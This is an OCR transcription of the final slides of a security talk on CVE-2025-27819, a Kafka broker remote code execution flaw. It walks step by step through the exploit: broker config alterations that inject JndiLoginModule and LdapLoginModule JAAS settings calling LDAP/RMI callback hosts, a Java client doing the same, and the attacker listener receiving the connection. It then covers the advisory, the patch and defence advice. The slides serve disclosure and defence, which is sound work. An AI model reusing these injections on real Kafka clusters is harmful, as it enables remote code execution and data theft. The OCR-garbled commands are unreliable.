Caused by: org.apache.kafka.common.errors.InvalidRequestException: Error creating broker listeners from 'SASL_PLAINTEXT://:50000,P
LAINTEXT: //kafka—kraft: 29092, CONTROLLER: //kafka—kraft : 29093, PLAINTEXT_HOST://0.0.0.0:9092': No security protocol defined for liste
ner SASL_PLAINTEXT
```

## Slide 109

# ❒ **Exploit it step by step**

The listener.security.protocol.map config

##### Previous

Now


> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
The listener.security.protocol.
map config
The security protocol of each listener is defined in a separate configuration:
listener.security,.protocol.map . The value is a comma-separated list of each
listener
mapped to its security protocol. For example, the follow value configuration specifies that the
CLIENT listener will use SSL while the BROKER listener will use plaintext.
Listener.security.protocol .map=CLIENT :SSL,BROKER: PLAINTEXT
Previous
rokers —-all|grep "listener\.security\.protocol\.map"
ROLLER: PLAINTEXT, PLAINTEXT: PLA
NTEXT, SSL:SSL, SAS
TEXT: SASL_PLAINTEXT, SASL_SSL: SASL_SSL}
Now
root@iZj6cit8a@25m7gcofé6pk4Z:~/kafka_2.13-3.3.2# bin/kafka-configs.sh --bootstrap-server 127.@.0.1:9092 --describe --entity-type b
rokers —-all|grep "listener\.security\.protocol\.map"
|listener.security.protocol.map=CONTROLLER: PLAINTEXT, PLAINTEXT : PLAINTEXT , PLAINTEXT_HOST : PLAINTEXT |sensitive=false synonyms={STATI
```

## Slide 110

# ❒ **Exploit it step by step**

#### Make a small adjustment

#### Trigger the patch logic


> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
Make a small adjustment
root@iZj6cit8a@25m7gcofépk4Z:~/kafka_2.13-3.3.2# bin/kafka-configs.sh --bootstrap-server 127.0.0.1:9092 --alter --broker 1 --a
dd-config 'listener.name.sasl_plaintext.plain.sasl.jaas.config=[com.sun.security.auth.module.JndiLoginModule required user.provide
r.url="ldap://127.0.0.1:1389/evil" useFirstPass="true" group.provider.url="xxx";],sasl.enabled.mechanisms=PLAIN,|listeners=[SASL_PL
tocol.map=[SASL_PLAINTEXT:SASL_PLAINTEXT ,\CONTROLLER: PLAINTEXT, PLAINTEXT: PLAINTEXT, PLAINTEXT_HOST: PLAINTEXT] '
Completed updating config for broker 1.
Trigger the patch logic
[2025-06-30 06:24:23,423] INFO Config values:
confluent.security.event.logger.detailed.audit.logs.disabled.apis =
confluent.security.event.logger.enable.detailed.audit.logs = false
confluent.security.event.logger.enable.produce.consume.audit.logs = false
(org.apache.kafka.common.requests.DetailedRequestAuditLogFilter$Config)
[2025-06-30 06:24:23,425] ERROR Per-broker configs of 1 could not be applied: java.util.Collections$3@5174c7b2 (kafka.server.Dynam
icBrokerConfig)
java.lang.IllegalArgumentException:| com.sun.security.auth.module.JndiLoginModule is not allowed, Update System property 'org.apach
at org.apache.kafka.common.security.JaasContext.throwI fLoginModuleIsNotAllowed(JaasContext.java:123)
at org.apache.kafka.common.security.JaasContext.load(JaasContext.java:110)
at org.apache.kafka.common.security.JaasContext.loadServerContext (JaasContext.java:84)
at org.apache.kafka.common.network.ChannelBuilders.serverChannelBuilder(ChannelBuilders.java:196)
at kafka.network.Processor.<init>(SocketServer.scala:1387)
```

## Slide 111

# ❒ **Exploit it step by step**

### The key is callback handler


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
The key is callback handler
1 import org.apache.kafka.clients.producer.KafkaProducer;
2 import java.util.Properties;
3
4 public class test {
5 public static void main(String[] args) {
6 Properties props = new Properties();
8 props.put("bootstrap.servers", "localhost:9092");
9 props.put("sasl.mechanism", "PLAIN");
10 props.put("sasl. login.callback.handler.class",
aka props.put("value.serializer", "org.apache.kafka.common.serialization.StringSerializer");
12 props.put("key.serializer", "“org.apache.kafka.common.serialization.StringSerializer");
13 props.put("sasl.jaas.config","com.sun.security.auth.module.LdapLoginModule required
java.naming. factory. initial=\"com.sun. jndi.rmi.registry.RegistryContextFactory\"
userProvider=\"rmi://127.0.@.1/a\" credentials_path=\"/etc/passwd\" username_config=\"root\"
password_config=\"root\" ;");
14 new KafkaProducer(props) ;
15 }
16 }
```

## Slide 112

# ❒ **Exploit it step by step**

### How to set the callback handler?

https://kafka.apache.org/documentation/


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
How to set the callback handler?
sasl.login.callback.handler.class
The fully qualified name of a SASL login callback handler class that implements the
AuthenticateCallbackHandler interface. For brokers, login callback handler config must be
prefixed with listener prefix and SASL mechanism name in lower-case. For example,
256.sasl.login.callback.handler.class=com.example.CustomScramLoginCallbackHandler
```

## Slide 113

❒ **Bypass!**


> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Bypass!
listener.name.sasl_plaintext.plain.sasl.jaas.config=[\com.sun.security.auth.module.LdapLoginModule required j
dd-config '
factory.initial="com.sun.jndi.rmi.registry.Registry
" username_config="root" password_config="root" ;],
ontextFactory" userProvider="rmi://172.17.0.1/a" credentials path="
ava.naming.
/etc/passwd
Fio.conflue
50000, PLAINTEXT: //kafka—kraft: 29092, CONTROLLER: //kafka—kraft:29093, PLAINTEXT_HOST://0.0.0.0:9092], listener.security.protocol.map=[
Completed updating config for broker 1.
Listening on 0.0.0.0 1099
Connection received on 172.17.0.2 59926
JRMIK
```

## Slide 114

❒ **Bypass!**


> Recovered by OCR — confidence 77/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Bypass!
root@iZj6c84h3p7hxdvzrrsn30Z:/# java -jar server-1.@-SNAPSHOT. jar I
```

## Slide 115

# ❒ **Report the finding**

### First-ever RCE vulnerability affecting Kafka Broker

https://kafka.apache.org/cve-list


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Report the finding
First-ever RCE vulnerability affecting Kafka Broker
CVE-2025-27819 APACHE KAFKA: POSSIBLE RCE/DENIAL OF SERVICE ATTACK VIA SASL JAAS
JNDILOGINMODULE CONFIGURATION
In CVE-2023-25194, we announced the RCE/Denial of service attack via SASL JAAS JndiLoginModule configuration in Kafka Connect API. But not
only Kafka Connect API is vulnerable to this attack, the Apache Kafka brokers also have this vulnerability. To exploit this vulnerability, the attacker
needs to be able to connect to the Kafka cluster and have the AlterConfigs permission on the cluster resource.
Since Apache Kafka 3.4.0, we have added a system property ("-Dorg.apache.kafka.disallowed.login.modules') to disable the problematic login
modules usage in SASL JAAS configuration. Also by default "com.sun.security.auth.module.JndiLoginModule" is disabled in Apache Kafka 3.4.0,
and "com.sun.security.auth.module.JndiLoginModule,com.sun.security.auth.module.LdapLoginModule" is disabled by default in Apache Kafka
3.9.1/4.0.0.
Versions affected 2.0.0 - 3.3.2
Fixed versions 3.9.1, 4.0.0
Bae Possible RCE/Denial of service attack via SASL JAAS
JndiLoginModule configuration
Advice We advise all Kafka users to upgrade kafka to version >=3.9.1.
Issue announced 9 Jun 2025
```

## Slide 116

# ❒ **Report the finding**

### Highest-ever bounty


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1 Report the finding
Highest-ever bounty
Based on our analysis of your reports—particularly related to the
demonstrated RCE impact (|! = ===5_p== ) ™ "—we are awarding you our
highest-ever bounty of ,® .§%%, along with an additional #9" bonus. This
recognizes not only the severity of the issue but also the broad scope of
affected assets, the thoroughness of your findings, and the clearly
demonstrated impact.
Reported by
& azraelxuemo
Reported to
Confluent
Participants
```

## Slide 117

❒ **Patch**


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1 Patch
CVE-2025-27819 APACHE KAFKA: POSSIBLE RCE/DENIAL OF SERVICE ATTACK VIA SASL JAAS
JNDILOGINMODULE CONFIGURATION
In CVE-2023-25194, we announced the RCE/Denial of service attack via SASL JAAS JndiLoginModule configuration in Kafka Connect API. But not
only Kafka Connect API is vulnerable to this attack, the Apache Kafka brokers also have this vulnerability. To exploit this vulnerability, the attacker
needs to be able to connect to the Kafka cluster and have the AlterConfigs permission on the cluster resource.
Since Apache Kafka 3.4.0, we have added a system property ("-Dorg.apache.kafka.disallowed.login.modules") to disable the problematic login
modules usage in SASL JAAS configuration. Also by default "com.sun.security.auth.module.JndiLoginModule" is disabled in Apache Kafka 3.4.0,
and "com.sun.security.auth.module.JIndiLoginModule,com.sun.security.auth.module.LdapLoginModule" js disabled by default in Apache Kafka
3.9.1/4.0.0.
public final class JaasUtils {
public static final String JAVA_LOGIN_CONFIG_PARAM = "java.security.auth. login.config";
@Deprecated(since = "4,2")
public static final String DISALLOWED_LOGIN_MODULES_ CONFIG = "org.apache.kafka.disallowed. login.modules";
public static final String ALLOWED_LOGIN_MODULES_CONFIG = "org.apache.kafka.allowed. login.modules";
@Deprecated(since = "4.2")
public static final String DISALLOWED_LOGIN_MODULES_DEFAULT =
“com.sun.security.auth.module.JndiLoginModule, com.sun.security.auth.module.LdapLoginModule";
```

## Slide 118

5. Defense

## Slide 119

# ❒ **Some recommendations**

- Keep your software up to date

- Authentication and authorization must be enabled

- Do not expose related components to the public internet

## Slide 120

Q&A

## Slide 121

Thanks!
